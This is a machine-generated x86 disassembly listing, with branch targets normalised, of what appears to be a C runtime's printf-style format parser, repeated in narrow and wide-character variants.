mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ff40
jmp r-xdata
mov ecx esi
call sub_4202af
jmp r-xdata
mov ecx esi
call sub_4214d3
test al al
je r-xdata
sub_41e6aa
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_4278e4
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d6f6
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41e7a6 ]
mov ecx esi
call sub_41f872
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f5c0
jmp r-xdata
mov ecx esi
call sub_422e8b
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ff7a
jmp r-xdata
mov ecx esi
call sub_420418
jmp r-xdata
mov ecx esi
call sub_42170d
test al al
je r-xdata
sub_41e7c6
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427920
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427ea8
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d728
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41e8ce ]
mov ecx esi
call sub_41f891
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f5fd
jmp r-xdata
mov ecx esi
call sub_422eb6
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ffa2
jmp r-xdata
mov ecx esi
call sub_420581
jmp r-xdata
mov ecx esi
call sub_42193c
test al al
je r-xdata
sub_41e8ee
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427920
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d505
test al al
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_427f8e
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d75d
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_427b7e
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d505
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41ea2a ]
mov ecx esi
call sub_41f8b0
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f63a
jmp r-xdata
mov ecx esi
call sub_422ee1
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41ffca
jmp r-xdata
mov ecx esi
call sub_4206ea
jmp r-xdata
mov ecx esi
call sub_421b6b
test al al
je r-xdata
sub_41ea4a
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427920
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_41d792
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41eb46 ]
mov ecx esi
call sub_41f8e1
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f677
jmp r-xdata
mov ecx esi
call sub_422f21
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_420004
jmp r-xdata
mov ecx esi
call sub_420853
jmp r-xdata
mov ecx esi
call sub_421da5
test al al
je r-xdata
sub_41eb66
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427905
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_427eca
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d7c4
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41ec76 ]
mov ecx esi
call sub_41f900
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f6b4
jmp r-xdata
mov ecx esi
call sub_422f4c
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_42002c
jmp r-xdata
mov ecx esi
call sub_4209bc
jmp r-xdata
mov ecx esi
call sub_421fd4
test al al
je r-xdata
sub_41ec96
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427905
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d551
test al al
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_42800e
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d7fb
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_427c76
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d551
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41edd6 ]
mov ecx esi
call sub_41f91f
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f6f1
jmp r-xdata
mov ecx esi
call sub_422f78
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_420055
jmp r-xdata
mov ecx esi
call sub_420b38
jmp r-xdata
mov ecx esi
call sub_422231
test al al
je r-xdata
sub_41edf6
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_427905
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d832
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41eef6 ]
mov ecx esi
call sub_41f950
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f72e
jmp r-xdata
mov ecx esi
call sub_422fb9
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_420090
jmp r-xdata
mov ecx esi
call sub_420cb4
jmp r-xdata
mov ecx esi
call sub_42249d
test al al
je r-xdata
sub_41ef16
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_42793b
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_427eec
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d866
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41f026 ]
mov ecx esi
call sub_41f96f
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f76b
jmp r-xdata
mov ecx esi
call sub_422fe5
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_4200b9
jmp r-xdata
mov ecx esi
call sub_420e30
jmp r-xdata
mov ecx esi
call sub_4226fa
test al al
je r-xdata
sub_41f046
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_42793b
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
push edi
mov ecx esi
call sub_41d59d
test al al
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x18 ]
or edi 0xffffffff
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
mov ecx esi
call sub_42808e
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d89d
mov ecx esi
mov [ esi + 0x1c ] eax
call sub_427d78
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov ecx esi
call sub_41d59d
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
cmp eax 0x8
je r-xdata
pop edi
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_41f186 ]
mov ecx esi
call sub_41f98e
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f7a8
jmp r-xdata
mov ecx esi
call sub_423011
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_4200e2
jmp r-xdata
mov ecx esi
call sub_420fac
jmp r-xdata
mov ecx esi
call sub_422957
test al al
je r-xdata
sub_41f1a6
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_42793b
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
movzx eax [ eax ]
mov [ esi + 0x32 ] ax
test ax ax
jne r-xdata
add [ esi + 0x10 ] 0x2
cmp [ esi + 0x18 ] ebx
jl r-xdata
add [ esi + 0x10 ] 0x2
push [ esi + 0x1c ]
movzx eax [ esi + 0x32 ]
mov ecx esi
push eax
call sub_41d8d4
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
cmp eax 0x7
ja r-xdata
or eax 0xffffffff
jmp r-xdata
jmp [ eax * 4 + jump_table_41f2a6 ]
mov ecx esi
call sub_41f9bf
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_41f7e5
jmp r-xdata
mov ecx esi
call sub_423052
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_42011d
jmp r-xdata
mov ecx esi
call sub_421128
jmp r-xdata
mov ecx esi
call sub_422bc3
test al al
je r-xdata
sub_41f3de
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f406
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f42e
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f456
mov edx [ ecx + 0x458 ]
cmp edx 0x1
jne r-xdata
cmp edx 0x2
jne r-xdata
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
xor al al
retn
cmp [ ecx + 0x45c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41f546
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f583
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f5c0
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f5fd
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f63a
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f677
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f6b4
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f6f1
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f72e
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f76b
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f7a8
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f7e5
movzx eax [ ecx + 0x32 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_41f841
mov edi edi
push esi
mov esi ecx
call sub_41f3de
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41fa08
test al al
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
pop esi
retn
sub_41f8b0
mov edi edi
push esi
mov esi ecx
call sub_41f406
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41fa86
test al al
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
pop esi
retn
sub_41f91f
mov edi edi
push esi
mov esi ecx
call sub_41f42e
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41faf5
test al al
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
pop esi
retn
sub_41f98e
mov edi edi
push esi
mov esi ecx
call sub_41f456
test al al
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_41fb46
test al al
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
pop esi
retn
sub_41f9de
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fb7c
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_42833f
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fa08
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fbdd
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_42833f
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fa32
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fc3e
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_42833f
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fa5c
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fc9f
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4283bc
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fa86
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fd00
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4283bc
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fab0
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_41fd61
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_4283bc
mov al 0x1
pop esi
retn
pop esi
retn
sub_41fb7c
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_42833f
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fbdd
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_42833f
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41fc3e
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
